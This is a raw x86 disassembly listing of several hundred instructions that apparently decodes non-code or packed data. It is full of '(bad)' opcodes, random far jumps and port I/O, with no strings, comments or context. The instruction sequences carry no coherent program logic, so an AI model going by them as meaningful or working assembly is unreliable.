  409f6c:	xor    BYTE PTR [ecx],dh
  409f6e:	xlat   BYTE PTR ds:[ebx]
  409f6f:	(bad)  
  409f70:	scas   eax,DWORD PTR es:[edi]
  409f71:	frstor [ebp+0xe0e79b1]
  409f77:	out    0x73,eax
  409f79:	add    eax,0x3ad5f622
  409f7e:	rol    DWORD PTR [eax-0x3f],1
  409f81:	push   es
  409f82:	cmp    BYTE PTR [edx+0x1b],dh
  409f85:	pop    esi
  409f86:	test   eax,0x642b8d89
  409f8b:	mov    bh,BYTE PTR [ecx+0x39e1d8ab]
  409f91:	mov    edx,0x7c355a75
  409f96:	pop    ebp
  409f97:	pop    eax
  409f98:	popf   
  409f99:	or     DWORD PTR [esi-0x37],esi
  409f9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f9d:	xchg   BYTE PTR [edi-0x53],dl
  409fa0:	in     al,0x4d
  409fa2:	loop   0x409f4b
  409fa4:	cmp    BYTE PTR [esi+0x6743072d],dl
  409faa:	ret    
  409fab:	lock cld 
  409fad:	mov    al,ds:0x1d35da24
  409fb2:	(bad)  
  409fb3:	cmp    edi,esi
  409fb5:	dec    eax
  409fb6:	mov    dl,0x95
  409fb8:	(bad)  [esi+eax*4]
  409fbb:	popf   
  409fbc:	and    eax,DWORD PTR [ebp-0x49]
  409fbf:	add    eax,0xbb684a38
  409fc4:	aam    0x12
  409fc6:	push   eax
  409fc7:	int3   
  409fc8:	sbb    dh,BYTE PTR fs:[ebp+0x1e2bfb01]
  409fcf:	xor    eax,0xc321e1c8
  409fd4:	shr    BYTE PTR [edi],1
  409fd6:	sub    eax,0x90f059ed
  409fdb:	retf   
  409fdc:	nop
  409fdd:	push   ds
  409fde:	sub    esi,DWORD PTR [edi-0x60]
  409fe1:	test   esp,eax
  409fe3:	dec    ebx
  409fe4:	(bad)  
  409fe5:	das    
  409fe6:	rcl    BYTE PTR [ecx],1
  409fe8:	adc    BYTE PTR [eax+ecx*1-0x10fc7d5e],cl
  409fef:	push   ecx
  409ff0:	sbb    al,0x53
  409ff2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ff3:	add    al,0xf9
  409ff5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ff6:	dec    ebx
  409ff7:	cli    
  409ff8:	(bad)  
  409ff9:	push   ecx
  409ffa:	cli    
  409ffb:	sub    DWORD PTR [ecx+edx*1+0x7c],0x9be4638a
  40a003:	mov    bl,0xee
  40a005:	push   ecx
  40a006:	mov    eax,ds:0xcd5cc106
  40a00b:	jno    0x40a023
  40a00d:	shl    BYTE PTR [eax],0x1a
  40a010:	retf   
  40a011:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a012:	cmp    eax,0xa7595af3
  40a017:	aam    0x13
  40a019:	inc    edi
  40a01a:	xlat   BYTE PTR ds:[ebx]
  40a01b:	add    eax,0x683de948
  40a020:	fs xchg esi,eax
  40a022:	inc    esi
  40a023:	dec    esp
  40a024:	and    al,0x7f
  40a026:	cld    
  40a027:	push   es
  40a028:	push   esp
  40a029:	retf   0x50ab
  40a02c:	or     DWORD PTR [ebp+edx*8-0x2653efad],edx
  40a033:	in     eax,dx
  40a034:	mov    edx,0x74263539
  40a039:	pop    ecx
  40a03a:	xor    bl,cl
  40a03c:	(bad)  
  40a03d:	jp     0x40a026
  40a03f:	mov    cl,0x1e
  40a041:	mov    ds:0x2aecd7f4,eax
  40a046:	in     eax,dx
  40a047:	les    esp,FWORD PTR [ecx]
  40a049:	(bad)  
  40a04b:	test   BYTE PTR [esi],0x17
  40a04e:	jb     0x409ff6
  40a050:	icebp  
  40a051:	aam    0x95
  40a053:	jl     0x40a01f
  40a055:	ins    BYTE PTR es:[edi],dx
  40a056:	sub    bh,BYTE PTR [edx]
  40a058:	iret   
  40a059:	mov    al,ds:0xaec3d471
  40a05e:	sbb    BYTE PTR [eax-0x30674d98],ch
  40a064:	outs   dx,BYTE PTR ds:[esi]
  40a065:	lods   eax,DWORD PTR ds:[esi]
  40a066:	pop    esi
  40a067:	cld    
  40a068:	push   esp
  40a069:	shl    DWORD PTR ds:0xb66e9078,0x19
  40a070:	or     edi,DWORD PTR [edi]
  40a072:	jmp    0xe448:0x17863daf
  40a079:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a07a:	cmp    al,0xaf
  40a07c:	cdq    
  40a07d:	add    DWORD PTR [eax],esp
  40a07f:	cmp    dh,ch
  40a081:	cmp    al,0xf
  40a083:	jb     0x40a0b9
  40a085:	arpl   WORD PTR [ecx+0xd760044],dx
  40a08b:	sub    al,0xef
  40a08d:	xor    bh,cl
  40a08f:	call   0x23d1e33b
  40a094:	shr    DWORD PTR ds:0x26f1b252,0x6c
  40a09b:	or     al,0x19
  40a09d:	sub    al,BYTE PTR [edx+0x56dc4890]
  40a0a3:	push   ecx
  40a0a4:	xor    ebx,ebp
  40a0a6:	push   ebx
  40a0a7:	ds adc al,0x30
  40a0aa:	fadd   DWORD PTR [edi+0x4e]
  40a0ad:	popf   
  40a0ae:	mov    ebx,0xdf7b9201
  40a0b3:	rcr    esp,1
  40a0b5:	dec    bh
  40a0b7:	ja     0x40a04f
  40a0b9:	cmp    eax,0x77605651
  40a0be:	jbe    0x40a0a8
  40a0c0:	push   esi
  40a0c1:	loop   0x40a048
  40a0c3:	popf   
  40a0c4:	mov    ch,0x65
  40a0c6:	pop    edi
  40a0c7:	sub    al,0x20
  40a0c9:	stc    
  40a0ca:	mov    ah,0x44
  40a0cc:	ja     0x40a0f3
  40a0ce:	xchg   DWORD PTR [ecx-0x2c],eax
  40a0d1:	fwait
  40a0d2:	push   ebp
  40a0d3:	push   0xe0dba364
  40a0d8:	rcr    ecx,1
  40a0da:	das    
  40a0db:	jae    0x40a0b0
  40a0dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0de:	fstp   TBYTE PTR [edx+eax*2]
  40a0e1:	xchg   ecx,eax
  40a0e2:	push   ecx
  40a0e3:	retf   0x7912
  40a0e6:	inc    edi
  40a0e7:	test   BYTE PTR [ecx-0x11],bl
  40a0ea:	adc    al,0xcd
  40a0ec:	lahf   
  40a0ed:	inc    esp
  40a0ee:	or     al,0xd3
  40a0f0:	test   al,0xf7
  40a0f2:	inc    edx
  40a0f3:	js     0x40a0a9
  40a0f5:	sub    ch,BYTE PTR [edx-0x4ed23da9]
  40a0fb:	add    al,0x73
  40a0fd:	ds push ds
  40a0ff:	ss and al,0xc
  40a102:	paddsb mm0,QWORD PTR [eax+0x24026326]
  40a109:	sub    BYTE PTR [edi+0x37],cl
  40a10c:	inc    esp
  40a10d:	ret    0x8efe
  40a110:	out    dx,al
  40a111:	lahf   
  40a112:	jno    0x40a0f5
  40a114:	pop    ecx
  40a115:	mov    ebp,0xa963337f
  40a11a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a11b:	sub    DWORD PTR [eax-0x4989ee5b],eax
  40a121:	test   al,0x15
  40a123:	out    0x1c,eax
  40a125:	jo     0x40a153
  40a127:	xchg   esp,eax
  40a128:	and    BYTE PTR [ebp+0x2e],al
  40a12b:	imul   edi,DWORD PTR ds:0xefd7e3e8,0x20
  40a132:	stos   DWORD PTR es:[edi],eax
  40a133:	jmp    0x40a1ab
  40a135:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a136:	cld    
  40a137:	xlat   BYTE PTR ds:[ebx]
  40a138:	retf   
  40a139:	das    
  40a13a:	pop    esi
  40a13b:	(bad)  
  40a13c:	jne    0x40a0ec
  40a13e:	jns    0x40a1a2
  40a140:	dec    edx
  40a141:	push   0xffffffcd
  40a143:	mov    WORD PTR [edx+0x5a],?
  40a146:	or     DWORD PTR gs:[ebx-0x7db21294],ecx
  40a14d:	pushf  
  40a14e:	jg     0x40a15c
  40a150:	outs   dx,DWORD PTR ds:[esi]
  40a151:	dec    ebx
  40a152:	mov    cl,0xb3
  40a154:	clc    
  40a155:	shr    BYTE PTR [ebx+0x20],0x6
  40a159:	ja     0x40a197
  40a15b:	rcr    BYTE PTR [edx-0x1cb5bff],cl
  40a161:	add    eax,0xdefa4a41
  40a166:	jnp    0x40a130
  40a168:	out    dx,eax
  40a169:	push   0xfffffffc
  40a16b:	jge    0x40a1cb
  40a16d:	jb     0x40a13d
  40a16f:	inc    edi
  40a170:	out    0x5,eax
  40a172:	cmp    bl,dh
  40a174:	inc    esi
  40a175:	in     al,dx
  40a176:	xchg   BYTE PTR [esp+ebx*2-0xea03884],dl
  40a17d:	test   al,bl
  40a17f:	out    dx,al
  40a180:	mov    BYTE PTR [ecx-0x33],dh
  40a183:	jecxz  0x40a1dd
  40a185:	pop    ds
  40a186:	call   0x393d0f89
  40a18b:	cmp    cl,BYTE PTR [ebx-0x261e86c1]
  40a191:	popf   
  40a192:	or     dh,ah
  40a194:	push   ecx
  40a195:	sub    al,0x7f
  40a197:	mov    ds:0xa48649a7,eax
  40a19c:	push   ds
  40a19d:	jecxz  0x40a16d
  40a19f:	int3   
  40a1a0:	sti    
  40a1a1:	loopne 0x40a13c
  40a1a3:	inc    DWORD PTR [edx+0x3f]
  40a1a6:	or     al,0x50
  40a1a8:	stos   DWORD PTR es:[edi],eax
  40a1a9:	test   BYTE PTR [ecx],ch
  40a1ab:	aaa    
  40a1ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1ad:	mov    ecx,ss
  40a1af:	cmp    BYTE PTR [esi+0x6ce625ff],bh
  40a1b5:	mov    ecx,0x27f00d5a
  40a1ba:	js     0x40a149
  40a1bc:	and    edx,DWORD PTR [esi-0x5e5acf74]
  40a1c2:	hlt    
  40a1c3:	addr16 sbb al,0x4c
  40a1c6:	mov    dh,0x42
  40a1c8:	or     esp,ebp
  40a1ca:	cmp    ah,BYTE PTR [esi-0x47]
  40a1cd:	mov    WORD PTR [eax+edi*4],?
  40a1d0:	and    edx,esi
  40a1d2:	cmc    
  40a1d3:	rcl    DWORD PTR ds:0x7eef1dec,1
  40a1d9:	in     eax,0x54
  40a1db:	out    0xba,ax
  40a1de:	aaa    
  40a1df:	or     ecx,DWORD PTR [ecx+0x63]
  40a1e2:	call   0x9f22:0x7bb2d5f7
  40a1e9:	(bad)  
  40a1ea:	xor    ebp,DWORD PTR [edx+0x26]
  40a1ed:	cwde   
  40a1ee:	imul   esp,DWORD PTR [eax],0x29d8198a
  40a1f4:	repz fs sbb al,0x61
  40a1f8:	lea    ebp,[ecx]
  40a1fa:	div    BYTE PTR [ebp+edi*1+0x1a529200]
  40a201:	dec    edi
  40a202:	imul   esi,DWORD PTR [ebx-0x71bbe47a],0xffffffc5
  40a209:	cdq    
  40a20a:	jge    0x40a1af
  40a20c:	push   esp
  40a20d:	dec    edi
  40a20e:	xchg   DWORD PTR [ebp+eiz*1-0x59fb3c2f],edi
  40a215:	fidiv  DWORD PTR es:[ecx]
  40a218:	rol    BYTE PTR [ebx-0x21],1
  40a21b:	lea    edi,[eax]
  40a21d:	adc    DWORD PTR [edi-0x105fc888],esi
  40a223:	and    eax,0x7e062c25
  40a228:	mov    edi,0x61d9b202
  40a22d:	int3   
  40a22e:	mov    bl,0x78
  40a230:	ss test eax,0x1f87f7dc
  40a236:	mov    dh,0xc7
  40a238:	mov    eax,0x987a962
  40a23d:	jmp    FWORD PTR [edx]
  40a23f:	(bad)  
  40a240:	fadd   DWORD PTR [ebp-0x32]
  40a243:	push   ss
  40a244:	jecxz  0x40a29e
  40a246:	xchg   ebx,eax
  40a247:	xor    al,0xd3
  40a249:	mov    al,ds:0xa3a3a8d1
  40a24e:	and    esp,DWORD PTR [ebx+0x2a]
  40a251:	mov    esi,0x402dec8e
  40a256:	scas   al,BYTE PTR es:[edi]
  40a257:	mov    ch,0xd2
  40a259:	loop   0x40a235
  40a25b:	in     al,dx
  40a25c:	aam    0x8c
  40a25e:	dec    sp
  40a260:	lods   al,BYTE PTR ds:[si]
  40a262:	mov    ch,0xdc
  40a264:	f2xm1  
  40a266:	push   eax
  40a267:	or     WORD PTR [ebp-0x69],bp
  40a26b:	add    ch,dl
  40a26d:	mov    esp,DWORD PTR [esi]
  40a26f:	pop    eax
  40a270:	aad    0xf0
  40a272:	push   esp
  40a273:	out    0xe5,al
  40a275:	fwait
  40a276:	pop    edx
  40a277:	pop    edx
  40a278:	and    ch,dh
  40a27a:	aad    0x2a
  40a27c:	inc    eax
  40a27d:	mov    bh,bl
  40a27f:	inc    eax
  40a280:	maxps  xmm2,XMMWORD PTR [eax-0xd]
  40a284:	mov    al,0x43
  40a286:	add    al,0x4
  40a288:	dec    ebp
  40a289:	mov    eax,ds:0x47b5e3c3
  40a28e:	adc    eax,0xd7289d77
  40a293:	add    eax,0x598a3360
  40a298:	jmp    0x40a26c
  40a29a:	jecxz  0x40a234
  40a29c:	jne    0x40a2e4
  40a29e:	sub    al,0xa2
  40a2a0:	lahf   
  40a2a1:	inc    esp
  40a2a2:	std    
  40a2a3:	mov    esi,0x7e842f21
  40a2a8:	stc    
  40a2a9:	sub    al,0x31
  40a2ab:	enter  0x9bb4,0x57
  40a2af:	aam    0x19
  40a2b1:	jmp    0x1b8923a6
  40a2b6:	jno    0x40a303
  40a2b8:	and    esp,eax
  40a2ba:	loop   0x40a28d
  40a2bc:	pop    ecx
  40a2bd:	dec    ecx
  40a2be:	mov    ebx,ebx
  40a2c0:	xor    BYTE PTR [edi],bh
  40a2c2:	mov    ebx,0x8209b298
  40a2c7:	and    al,0xb6
  40a2c9:	adc    DWORD PTR [ecx*8+0x56d1396e],ebp
  40a2d0:	stos   DWORD PTR es:[edi],eax
  40a2d1:	out    dx,eax
  40a2d2:	lahf   
  40a2d3:	and    DWORD PTR [ecx-0x2d3b7158],ebx
  40a2d9:	mov    dh,cl
  40a2db:	cdq    
  40a2dc:	xor    BYTE PTR [edi-0xb],cl
  40a2df:	mov    BYTE PTR [ebx-0x3c152149],bl
  40a2e5:	sbb    BYTE PTR [eax],cl
  40a2e7:	addr16 jae 0x40a27a
  40a2ea:	call   0xa8ea:0xad8bebd7
  40a2f1:	mov    esp,fs
  40a2f3:	mov    ah,0xc8
  40a2f5:	mov    al,0x48
  40a2f7:	jnp    0x40a29a
  40a2f9:	repz jo 0x40a304
  40a2fc:	sbb    cl,BYTE PTR [edi]
  40a2fe:	inc    ecx
  40a2ff:	imul   ebp,DWORD PTR [ebx-0x27],0x25cf54c6
  40a306:	add    al,0x4f
  40a308:	push   0xbd0c5d73
  40a30d:	mov    esi,DWORD PTR [edi+ebx*8+0x24]
  40a311:	jae    0x40a336
  40a313:	adc    bh,bh
  40a315:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40a317:	rcl    BYTE PTR [ecx+0x32b0afc7],0x1d
  40a31e:	sbb    al,0x1c
  40a320:	pop    ecx
  40a321:	jge    0x40a2e2
  40a323:	popa   
  40a324:	pop    eax
  40a325:	cld    
  40a326:	cmp    BYTE PTR [esi*1+0x5c8b1855],ah
  40a32d:	push   ebp
  40a32e:	out    0x40,al
  40a330:	xchg   edx,eax
  40a331:	mov    ah,0x85
  40a333:	mov    bl,0x87
  40a335:	retf   0xb75d
  40a338:	jae    0x40a375
  40a33a:	dec    edx
  40a33b:	sub    DWORD PTR [esi+eiz*8-0x5f58d771],ecx
  40a342:	cli    
  40a343:	aad    0x58
  40a345:	mov    esp,0xccb31d74
  40a34a:	xchg   esp,eax
  40a34b:	and    bh,BYTE PTR ds:0x7634107f
  40a351:	ds mov ebx,0xc51c32d1
  40a357:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a358:	mov    ebp,0x425d6d96
  40a35d:	lds    ecx,FWORD PTR [esp+ebp*4]
  40a360:	mov    bl,0xe7
  40a362:	adc    ebx,edi
  40a364:	lods   eax,DWORD PTR ds:[esi]
  40a365:	or     eax,0x3d5ed844
  40a36a:	or     DWORD PTR [ebx-0x1cc9bb3a],0x7e
  40a371:	pop    edi
  40a372:	ins    DWORD PTR es:[edi],dx
  40a373:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a374:	cmovbe esp,DWORD PTR [esi+ebp*8+0x6f]
  40a379:	pop    esp
  40a37a:	xchg   edi,eax
  40a37b:	mov    al,ds:0x1043e03a
  40a380:	int3   
  40a381:	push   ecx
  40a382:	repnz sar BYTE PTR [esi-0x79],1
  40a386:	daa    
  40a387:	mov    DWORD PTR [ecx-0x1a],esi
  40a38a:	in     eax,0xe3
  40a38c:	hlt    
  40a38d:	or     DWORD PTR [ebp-0x42],0x166df2b9
  40a394:	cmp    eax,DWORD PTR [ebp+0x4984f25a]
  40a39a:	out    dx,al
  40a39b:	cdq    
  40a39c:	inc    ecx
  40a39d:	lods   eax,DWORD PTR ds:[esi]
  40a39e:	daa    
  40a39f:	sub    DWORD PTR [edx-0x51a0ba28],edx
  40a3a5:	dec    ebp
  40a3a6:	imul   edi,DWORD PTR [ebx],0x50
  40a3a9:	mov    ch,0x4
  40a3ab:	xchg   esp,eax
  40a3ac:	out    dx,al
  40a3ad:	scas   al,BYTE PTR es:[edi]
  40a3ae:	mov    esi,0xf60b14f7
  40a3b3:	jns    0x40a3f4
  40a3b5:	push   esi
  40a3b6:	(bad)  
  40a3b7:	in     eax,dx
  40a3b8:	mov    eax,ds:0x51e449ec
  40a3bd:	push   es
  40a3be:	mov    WORD PTR [edi],?
  40a3c0:	sbb    BYTE PTR [edx+ebp*8],ah
  40a3c3:	inc    ebp
  40a3c4:	(bad)  
  40a3c5:	xor    eax,0x36ee66a4
  40a3ca:	pop    ss
  40a3cb:	mov    dl,0x4
  40a3cd:	push   esp
  40a3ce:	pop    ebx
  40a3cf:	cmp    eax,0x46901d13
  40a3d4:	dec    esi
  40a3d5:	mov    ch,0x41
  40a3d7:	out    dx,eax
  40a3d8:	test   eax,0xe66fb8fa
  40a3dd:	cld    
  40a3de:	test   BYTE PTR [edx],0xb1
  40a3e1:	push   ss
  40a3e2:	out    0xe,al
  40a3e4:	inc    eax
  40a3e5:	(bad)  
  40a3e6:	pop    eax
  40a3e7:	jb     0x40a3cc
  40a3e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3ea:	or     edx,ebp
  40a3ec:	ret    0xb5fd
  40a3ef:	sbb    esp,DWORD PTR [esi]
  40a3f1:	cmp    dh,dl
  40a3f3:	pop    es
  40a3f4:	scas   eax,DWORD PTR es:[edi]
  40a3f5:	dec    esi
  40a3f6:	sbb    al,0x83
  40a3f8:	outs   dx,DWORD PTR ds:[esi]
  40a3f9:	mov    ebx,0x78e65838
  40a3fe:	enter  0x417a,0xb5
  40a402:	sar    DWORD PTR ds:[ecx+edx*4-0x6fb4ecbf],0xe4
  40a40b:	retf   
  40a40c:	cwde   
  40a40d:	cmc    
  40a40e:	xchg   bh,cl
  40a410:	mov    esp,0x8a671935
  40a415:	sub    al,dh
  40a417:	pop    edi
  40a418:	push   0xc2f5a73a
  40a41d:	jmp    0x19ca98d3
  40a422:	xchg   ebx,eax
  40a423:	mov    eax,0x4887ce06
  40a428:	pop    edx
  40a429:	enter  0xefff,0x27
  40a42d:	sub    cl,BYTE PTR [eax]
  40a42f:	out    0x89,eax
  40a431:	nop
  40a432:	(bad)  
  40a433:	lock xor BYTE PTR [ebx],al
  40a436:	enter  0x3384,0xec
  40a43a:	adc    ch,ch
  40a43c:	mov    bh,dh
  40a43e:	dec    edx
  40a43f:	mov    edi,0x489f0c6f
  40a444:	retf   
  40a445:	loop   0x40a405
  40a447:	jecxz  0x40a4c6
  40a449:	xor    esp,edi
  40a44b:	cli    
  40a44c:	pop    edi
  40a44d:	mov    bl,0x8e
  40a44f:	xchg   edx,eax
  40a450:	daa    
  40a451:	mov    eax,0x4c85ad3a
  40a456:	xor    BYTE PTR [edi-0x6d],cl
  40a459:	xchg   esi,eax
  40a45a:	shl    DWORD PTR [ecx-0x16552334],cl
  40a460:	dec    esi
  40a461:	pop    ebx
  40a462:	pop    edx
  40a463:	rcl    DWORD PTR ds:0x899c6f42,1
  40a469:	or     DWORD PTR ss:[edi-0x7d],eax
  40a46d:	jp     0x40a4e2
  40a46f:	stos   BYTE PTR es:[edi],al
  40a470:	ret    
  40a471:	mov    ebp,0xc9ca0b2f
  40a476:	arpl   WORD PTR [edi],bp
  40a478:	pop    ecx
  40a479:	mov    eax,ds:0xbba4dba3
  40a47e:	or     eax,0x8b79a38b
  40a483:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a484:	mov    BYTE PTR ss:[edi],bh
  40a487:	push   eax
  40a488:	ss cmp eax,0x6175a4c1
  40a48e:	imul   ebx,DWORD PTR [edx],0xc
  40a491:	clc    
  40a492:	pop    edi
  40a493:	inc    edx
  40a494:	lods   al,BYTE PTR ds:[esi]
  40a495:	arpl   WORD PTR fs:[ebx],si
  40a498:	jb     0x40a4ac
  40a49a:	jg     0x40a4df
  40a49c:	sub    dh,bh
  40a49e:	cmc    
  40a49f:	push   ebx
  40a4a0:	(bad)  
  40a4a1:	push   edi
  40a4a2:	jg     0x40a4f9
  40a4a4:	sub    dl,dh
  40a4a6:	push   ebp
  40a4a7:	dec    ebp
  40a4a8:	pop    edx
  40a4a9:	hlt    
  40a4aa:	daa    
  40a4ab:	in     al,dx
  40a4ac:	inc    edx
  40a4ad:	mov    ah,0x65
  40a4af:	lods   eax,DWORD PTR ds:[esi]
  40a4b0:	mov    edi,edx
  40a4b2:	inc    ecx
  40a4b3:	dec    esp
  40a4b4:	and    bh,bl
  40a4b6:	jmp    0x7dd964fb
  40a4bb:	push   esp
  40a4bc:	xor    DWORD PTR [edi],edx
  40a4be:	cld    
  40a4bf:	test   eax,0x3e9d1fe7
  40a4c4:	dec    esp
  40a4c5:	dec    esp
  40a4c6:	push   0x72
  40a4c8:	jno    0x40a502
  40a4ca:	dec    ebx
  40a4cb:	push   es
  40a4cc:	pusha  
  40a4cd:	(bad)  
  40a4cf:	shr    BYTE PTR [ebx+0x5],cl
  40a4d2:	clc    
  40a4d3:	cmp    dl,ch
  40a4d5:	stos   DWORD PTR es:[edi],eax
  40a4d6:	dec    esi
  40a4d7:	push   ds
  40a4d8:	pop    ss
  40a4d9:	xor    DWORD PTR [esi+0x67e71e92],0xffffffba
  40a4e0:	mov    bl,0xbc
  40a4e2:	stos   DWORD PTR es:[edi],eax
  40a4e3:	xor    al,0x54
  40a4e5:	mov    esi,DWORD PTR [eax+0x11]
  40a4e8:	dec    ebp
  40a4e9:	mov    ah,0x2d
  40a4eb:	adc    DWORD PTR [edi-0x2e1c59ea],ebx
  40a4f1:	in     al,dx
  40a4f2:	xchg   ecx,eax
  40a4f3:	dec    esi
  40a4f4:	stos   BYTE PTR es:[edi],al
  40a4f5:	mov    ds:0x1a5f3abb,al
  40a4fa:	jecxz  0x40a497
  40a4fc:	sti    
  40a4fd:	lahf   
  40a4fe:	mul    eax
  40a500:	sbb    al,0x9e
  40a502:	xchg   DWORD PTR [ebp+0x5c28cd5],esi
  40a508:	and    ah,BYTE PTR [ebx+0x36]
  40a50b:	xlat   BYTE PTR ds:[ebx]
  40a50c:	jae    0x40a527
  40a50e:	outs   dx,DWORD PTR ds:[esi]
  40a50f:	and    bh,BYTE PTR [edx]
  40a511:	pusha  
  40a512:	pop    esp
  40a513:	pop    eax
  40a514:	stos   DWORD PTR es:[edi],eax
  40a515:	outs   dx,DWORD PTR ds:[esi]
  40a516:	push   esi
  40a517:	ins    BYTE PTR es:[edi],dx
  40a518:	sahf   
  40a519:	sti    
  40a51a:	push   es
  40a51b:	jecxz  0x40a538
  40a51d:	xchg   edx,eax
  40a51e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a51f:	jno    0x40a4ec
  40a521:	test   al,0x5e
  40a523:	dec    ecx
  40a524:	mov    ah,0x9
  40a526:	ins    BYTE PTR es:[edi],dx
  40a527:	mov    al,ds:0x84d229a8
  40a52c:	dec    ebx
  40a52d:	imul   esp,DWORD PTR [edx+0x70f20f25],0x53
  40a534:	ss ret 0x47e8
  40a538:	xchg   esi,eax
  40a539:	xor    eax,0x918fe16a
  40a53e:	mov    BYTE PTR ds:0x81ca5155,dl
  40a544:	sbb    eax,0x77ff1cc6
  40a549:	pusha  
  40a54a:	jp     0x40a59a
  40a54c:	xchg   ebp,eax
  40a54d:	mov    esi,0xf5582fc7
  40a552:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a553:	jl     0x40a545
  40a555:	(bad)  
  40a556:	cli    
  40a557:	jb     0x40a4f8
  40a559:	mov    ah,0xc8
  40a55b:	call   0xe842:0x6c426914
  40a562:	dec    esp
  40a563:	repnz xor cl,al
  40a566:	inc    esi
  40a567:	popf   
  40a568:	dec    esp
  40a569:	les    edx,FWORD PTR [ebx-0x5e]
  40a56c:	popf   
  40a56d:	add    DWORD PTR [ecx],0x145bced2
  40a573:	inc    esp
  40a574:	jno    0x40a587
  40a576:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a577:	xchg   ebx,eax
  40a578:	ds xor al,0xbc
  40a57b:	mov    esi,0x7acbf5cd
  40a580:	loopne 0x40a585
  40a582:	add    al,0x26
  40a584:	jle    0x40a580
  40a586:	aad    0x32
  40a588:	test   DWORD PTR [eax+edx*4],eax
  40a58b:	fs jmp 0x490b:0x658cf282
  40a593:	mov    al,0xe7
  40a595:	fucom  st(3)
  40a597:	push   ebx
  40a598:	adc    esp,DWORD PTR [edi+ecx*4]
  40a59b:	mov    ebp,?
  40a59d:	iret   
  40a59e:	scas   eax,DWORD PTR es:[edi]
  40a59f:	inc    edx
  40a5a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5a1:	out    0x2c,al
  40a5a3:	bound  eax,QWORD PTR ds:0xc73c230e
  40a5a9:	pop    esi
  40a5aa:	push   ds
  40a5ab:	pop    ecx
  40a5ac:	inc    esp
  40a5ad:	sbb    eax,DWORD PTR [edi+0x4c]
  40a5b0:	pop    ebp
  40a5b1:	push   eax
  40a5b2:	mov    ds:0xba1f1a6d,al
  40a5b7:	and    esi,ecx
  40a5b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5ba:	out    dx,eax
  40a5bb:	nop
  40a5bc:	loopne 0x40a59d
  40a5be:	std    
  40a5bf:	sar    ecx,1
  40a5c1:	sub    eax,0xf2c3e8
  40a5c6:	test   eax,0x93217d56
  40a5cb:	mov    eax,0x3f59920
  40a5d0:	daa    
  40a5d1:	push   eax
  40a5d2:	out    0x75,eax
  40a5d4:	ret    0x4a62
  40a5d7:	mov    eax,ds:0xe2fc6f2f
  40a5dc:	outs   dx,DWORD PTR ds:[esi]
  40a5dd:	mov    bl,0xf2
  40a5df:	sbb    eax,0xd6005e54
  40a5e4:	mov    dh,0x72
  40a5e6:	(bad)  
  40a5e7:	popf   
  40a5e8:	mov    edi,0x1e84fba3
  40a5ed:	add    al,0xb9
  40a5ef:	and    bh,BYTE PTR [edi]
  40a5f1:	mov    ecx,0x8db31b24
  40a5f6:	fild   QWORD PTR [ebx+edi*8-0x21]
  40a5fa:	mov    eax,0x3ab5208e
  40a5ff:	outs   dx,DWORD PTR ds:[esi]
  40a600:	push   es
  40a601:	pop    edi
  40a602:	lods   eax,DWORD PTR ds:[esi]
  40a603:	jmp    0x2dbc098c
  40a608:	shl    al,0xe0
  40a60b:	or     DWORD PTR [eax],edx
  40a60d:	not    BYTE PTR [ebp+0x5584c741]
  40a613:	fs jg  0x40a637
  40a616:	jbe    0x40a5ac
  40a618:	pop    es
  40a619:	jnp    0x40a693
  40a61b:	add    al,0x80
  40a61d:	mov    ah,0xf
  40a61f:	retf   
  40a620:	imul   eax,DWORD PTR [edi-0x7c57cb5c],0x6ea9abbf
  40a62a:	mov    ebx,DWORD PTR [ecx]
  40a62c:	and    DWORD PTR gs:[ebx-0x20b3c966],edx
  40a633:	lods   al,BYTE PTR ds:[esi]
  40a634:	mov    dl,0xdd
  40a636:	enter  0x1a92,0x3c
  40a63a:	test   al,0xe4
  40a63c:	test   BYTE PTR [edi+0x5e9ca9f8],bh
  40a642:	fld    TBYTE PTR [edi-0x6dabd85]
  40a648:	sub    al,0xe1
  40a64a:	push   0xffffff88
  40a64c:	xchg   ebx,eax
  40a64d:	jo     0x40a5ff
  40a64f:	xchg   edi,eax
  40a650:	push   ebp
  40a651:	pusha  
  40a652:	jne    0x40a6bf
  40a654:	mov    bl,0x9
  40a656:	lods   al,BYTE PTR ds:[esi]
  40a657:	ja     0x40a665
  40a659:	mov    esp,0xc45efa33
  40a65e:	fild   DWORD PTR [ebx+0x27e964a1]
  40a664:	aaa    
  40a665:	scas   eax,DWORD PTR es:[edi]
  40a666:	mov    al,0x9b
  40a668:	sbb    BYTE PTR [ebx],ah
  40a66a:	cmp    bh,BYTE PTR [esi]
  40a66c:	hlt    
  40a66d:	inc    edi
  40a66e:	es or  ah,0xd1
  40a672:	inc    esi
  40a673:	add    ah,BYTE PTR [esi-0x3f]
  40a676:	in     al,dx
  40a677:	inc    eax
  40a678:	mov    edi,DWORD PTR [ebp-0x9]
  40a67b:	shl    bl,0x51
  40a67e:	shl    BYTE PTR [edx-0x79],0x20
  40a682:	mov    BYTE PTR [ebp+ebx*4+0x7b2a880a],al
  40a689:	pop    edi
  40a68a:	dec    ebx
  40a68b:	iret   
  40a68c:	daa    
  40a68d:	stc    
  40a68e:	push   ebp
  40a68f:	push   ebp
  40a690:	lea    ebp,[ebx+0x14644218]
  40a696:	sbb    ah,bl
  40a698:	outs   dx,DWORD PTR ds:[esi]
  40a699:	or     eax,0xcb3225bb
  40a69e:	popf   
  40a69f:	fsubr  st(6),st
  40a6a1:	aas    
  40a6a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
